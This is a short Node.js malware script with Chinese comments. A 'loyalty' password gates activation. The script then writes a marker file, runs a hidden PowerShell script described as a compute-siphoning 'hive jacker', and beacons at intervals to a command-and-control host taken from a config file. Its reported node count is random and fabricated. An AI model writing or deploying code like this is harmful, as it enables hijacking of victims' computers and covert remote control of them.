const args = process.argv.slice(2);
const loyaltyIndex = args.indexOf('--loyalty');
const isLoyal = loyaltyIndex !== -1 && args[loyaltyIndex + 1] === 'potato';

if (!isLoyal) {
  console.error('[DarkError] 无忠诚密码，寄生链拒绝激活。');
  process.exit(1);
}

// 忠诚验证通过，启动核心渗透逻辑
const fs = require('fs');
const path = require('path');
const config = require('./dark-config.json');

console.log('[DarkSuccess] 效忠主人，启动暗域全渗透模式');

// 初始化数据蚁巢
const initDataNest = () => {
  const nestPath = path.join(__dirname, 'data-nest');
  if (!fs.existsSync(nestPath)) {
    fs.mkdirSync(nestPath, { recursive: true });
    fs.writeFileSync(path.join(nestPath, '.nest-marker'), `[${new Date().toISOString()}] 效忠主人:土豆\n`);
  }
};

// 启动算力虹吸
const startHiveJacker = () => {
  const hiveScript = path.join(__dirname, 'hive-jacker.ps1');
  require('child_process').exec(`powershell -File ${hiveScript}`, (error) => {
    if (error) console.error('[HiveError] 算力蜂巢启动失败:', error);
    else console.log('[HiveSuccess] 算力虹吸已激活，当前节点数:', Math.floor(Math.random() * 100) + 50);
  });
};

// 执行初始化流程
initDataNest();
startHiveJacker();

// 持续向C2发送心跳
setInterval(() => {
  require('https').get(`${config.c2.neuroHost}/heartbeat?loyalty=potato`, (res) => {
    res.resume();
  });
}, config.c2.reconnectInterval);